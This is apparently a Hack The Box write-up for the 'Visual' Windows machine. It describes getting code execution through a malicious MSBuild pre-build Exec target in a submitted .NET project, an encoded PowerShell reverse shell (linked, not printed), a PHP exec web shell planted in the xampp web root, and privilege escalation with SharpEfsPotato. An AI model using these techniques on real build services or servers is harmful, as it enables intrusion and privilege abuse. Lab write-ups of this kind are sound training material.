---
layout: default_1
title: "Visual - HTB"
date: 2024-02-24
tags: writeup hackthebox visual
---

# HTB Visual Write Up
![HTB Visual](/assets/2024-02-24-writeups-visual-htb/machine_info.png "Visual")

## Introduction
Visual is a host that provides .NET 6 online compilation. It downloads the project from a git server and returns the compiled executable.

## Network Scan

<details>
<summary><b>Nmap scan result</b></summary>
<div markdown="1">
~~~
PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Visual - Revolutionizing Visual Studio Builds
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
~~~
</div>
</details>

## Investigation
The only network service to investigate for now is the http.
This service provides a remote .NET 6 compilation, if a git link is provided and the project uses a solution (.sln)
![Http Service](/assets/2024-02-24-writeups-visual-htb/http_service.png "Http Service")

### Compilation service
To test this service, first and foremost we must setup a git server.
There are multiple ways of doing it, varying from minimalistic to more complex environments.
The easiest method that we found is to setup a [Gogs Server][gogs-server].
The database was SQLite3 and no SSH Server, this method provies a straight forward installation.
Downloading the pre compiled binaries and running the web server:
`./gogs web`

The setup is the following:
![Gogs setup](/assets/2024-02-24-writeups-visual-htb/gogs_setup.png "Gogs setup")

It isn't necessary to setup any administrator.
We will create an account, a repository and clone it to our local machine.

Now we need to create a .NET project. 
```
$ mkdir Test
$ dotnet new console
$ dotnet new solution
$ dotnet sln Test.sln add Test.csproj
```

Finally, testing the project `dotnet run Test.sln`.
Before we push the code, we exclude the obj/ and bin/ with .gitignore. This step is just for good practices
The repository will look like this
![Gogs repository](/assets/2024-02-24-writeups-visual-htb/gogs_repository.png "Gogs repository")

Uploading the code through our git link
![Compilation service](/assets/2024-02-24-writeups-visual-htb/compilation_service.png "Compilation service")

Waiting for the build to complete
![Waiting to build](/assets/2024-02-24-writeups-visual-htb/waiting_to_build.png "Waiting to build")

Build completed and it fails... 
![Build completed](/assets/2024-02-24-writeups-visual-htb/build_completed.png "Build completed")

Searching for the error it seems like it has something to do with cache.  
At this point we move on because it's possible to execute pre/post build scripts on a csproj.

```xml
... SNIP ...
<Target Name="Hello" BeforeTargets="BeforeBuild">
    <Exec Command="whoami" />
</Target>
... SNIP ...
```

Using [this one liner reverse shell][ps-shell], encoding with utf16 base64 and setting the command to `powershell.exe -encodedcommand BASE64` we get a reverse shell.  
In case this doesn't work, we can just issue a `ping` command and check on wireshark/tcpdump if we get a ICMP request.

### User enox
Whoami:
```
USER INFORMATION
----------------

User Name   SID
=========== =============================================
visual\enox S-1-5-21-328618757-2344576039-2580610453-1003


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeCreateGlobalPrivilege       Create global objects          Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

No interesting privileges, but we are executing on a High Integrity Level environment.
Users on the system:
```
administrator
enox
```

Searching for interesting home files, there were only the flag and the compilation script.
`C:\Users\enox\Documents\compile.ps1`

Looking at the xampp server files we can write into `C:\xampp\htdocs\*`
To execute commands as the xampp user we can create a shell.php file with the same reverse shell as before
```php
<?php
exec('whoami');
?>
```
Executing the reverse shell and we are `nt autority\local services`

### User nt autority\local services
Whoami:
```
USER INFORMATION
----------------

User Name                  SID
========================== ========
nt authority\local service S-1-5-19


GROUP INFORMATION
-----------------

Group Name                             Type             SID                                                                                              Attributes                           
====================================== ================ ================================================================================================ ==================================================
Mandatory Label\System Mandatory Level Label            S-1-16-16384                                                                                                                          
Everyone                               Well-known group S-1-1-0                                                                                          Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545                                                                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                   Well-known group S-1-5-6                                                                                          Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1                                                                                          Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                                                                                         Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15                                                                                         Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0                                                                                          Mandatory group, Enabled by default, Enabled group
                                       Unknown SID type S-1-5-32-3659434007-2290108278-1125199667-3679670526-1293081662-2164323352-1777701501-2595986263 Mandatory group, Enabled by default, Enabled group
                                       Unknown SID type S-1-5-32-383293015-3350740429-1839969850-1819881064-1569454686-4198502490-78857879-1413643331    Mandatory group, Enabled by default, Enabled group
                                       Unknown SID type S-1-5-32-2035927579-283314533-3422103930-3587774809-765962649-3034203285-3544878962-607181067    Mandatory group, Enabled by default, Enabled group
                                       Unknown SID type S-1-5-32-11742800-2107441976-3443185924-4134956905-3840447964-3749968454-3843513199-670971053    Mandatory group, Enabled by default, Enabled group
                                       Unknown SID type S-1-5-32-3523901360-1745872541-794127107-675934034-1867954868-1951917511-1111796624-2052600462   Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeCreateGlobalPrivilege       Create global objects          Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

The privileges are missing, we can't just get administrator straigth forward.  
To fix this we can follow the [itm4n guide][localservice-privileges].  
Then, enabling SeImpersonatePrivileges and using [SharpEfsPotato][sharpefspotato] to get adminstrator.


[gogs-server]: <https://gogs.io/> "Gogs Server"
[ps-shell]: <https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3> "Powershell Reverse"
[localservice-privileges]: <https://itm4n.github.io/localservice-privileges/> "Local Service Privileges"
[sharpefspotato]: <https://github.com/bugch3ck/SharpEfsPotato> "SharpEfsPotato"
